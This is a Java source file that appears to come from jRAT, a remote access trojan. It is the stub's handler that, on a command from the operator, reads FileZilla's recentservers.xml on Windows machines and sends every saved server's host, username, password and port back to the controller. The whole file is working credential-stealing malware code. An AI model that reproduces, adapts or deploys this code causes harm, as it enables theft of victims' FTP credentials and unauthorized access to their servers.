package io.jrat.stub.packets.incoming;

import io.jrat.common.OperatingSystem;
import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet48FileZillaPassword;
import io.jrat.stub.utils.Utils;

import java.io.File;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;


public class Packet68FileZillaPassword extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File file = null;
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			file = new File(System.getenv("APPDATA") + "\\FileZilla\\recentservers.xml");

			if (file.exists()) {
				DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
				DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
				Document doc = dBuilder.parse(file);
				doc.getDocumentElement().normalize();

				NodeList nList = doc.getElementsByTagName("Server");
				for (int temp = 0; temp < nList.getLength(); temp++) {
					Node nNode = nList.item(temp);
					if (nNode.getNodeType() == Node.ELEMENT_NODE) {
						Element eElement = (Element) nNode;

						Connection.addToSendQueue(new Packet48FileZillaPassword(Utils.getTagValue("Host", eElement), Utils.getTagValue("User", eElement), Utils.getTagValue("Pass", eElement), Utils.getTagValue("Port", eElement)));
					}
				}
			}
		}

	}

}
